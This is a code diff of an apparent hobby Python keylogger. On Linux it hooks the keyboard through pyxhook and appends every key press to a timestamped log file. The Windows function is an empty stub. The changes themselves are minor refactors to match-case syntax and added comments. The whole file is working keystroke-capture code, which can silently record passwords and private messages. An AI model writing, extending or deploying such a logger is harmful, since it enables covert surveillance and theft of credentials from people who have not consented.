@@ -5,24 +5,28 @@ from datetime import datetime
 import pyxhook
 import platform
 
-# Function for Linux-based OS
+# Function for Linux-based OS keylogger
 def linuxKeylogger():
     # Create log file
     log = f"{datetime.now().strftime("%d-%m-%Y|%H:%M")}.log"
 
-    def OnKeyPress(event):
+    def onPress(event):
 
         # Open log file and append key presses
         with open(log, "a") as f:
             # If 'Enter' key is pressed, replace with newline
-            if event.Key == "P_Enter":
-                f.write('\n')
-            else:
-                # Append key presses to file and convert ascii to readable characters
-                f.write(f"{chr(event.Ascii)}")
+            # Use match case for special characters, maybe
+            match event.Key:
+                case "P_Enter": f.write('\n')
+                case _: f.write(f"{chr(event.Ascii)}") # Append key presses to file and convert ascii to readable characters
 
+    # Create hookmanager
     hook = pyxhook.HookManager()
-    hook.KeyDown = OnKeyPress
+
+    # Define callback to fire when a key is pressed
+    hook.KeyDown = onPress
+
+    # Hook the keyboard
     hook.HookKeyboard()
 
     try:
@@ -37,22 +41,22 @@ def linuxKeylogger():
         with open(log, "a") as f:
             f.write(f"\n{msg}")
 
-# Function for Windows-based OS
+# Function for Windows-based OS keylogger
 def winKeylogger():
      
     print("Run Windows keylogger...")
 
 
 def main():
-    # Create object for 'osQuery' class and run it to determine OS
+    # Determine the OS running and print it
     OS = platform.system()
     print(f"{OS}")
 
     # Match case to run OS-dependant function
     match OS:
         case "Linux": linuxKeylogger() # Call Linux-based keylogger
-        case 'Windows': winKeylogger() # Call Windows-based keylogger
-        case _: return "OS is not 'Windows' or 'Linux'."
+        case "Windows": winKeylogger() # Call Windows-based keylogger
+        case _: print("OS is not 'Windows' or 'Linux'.")
 
 if __name__ == "__main__":
     main()
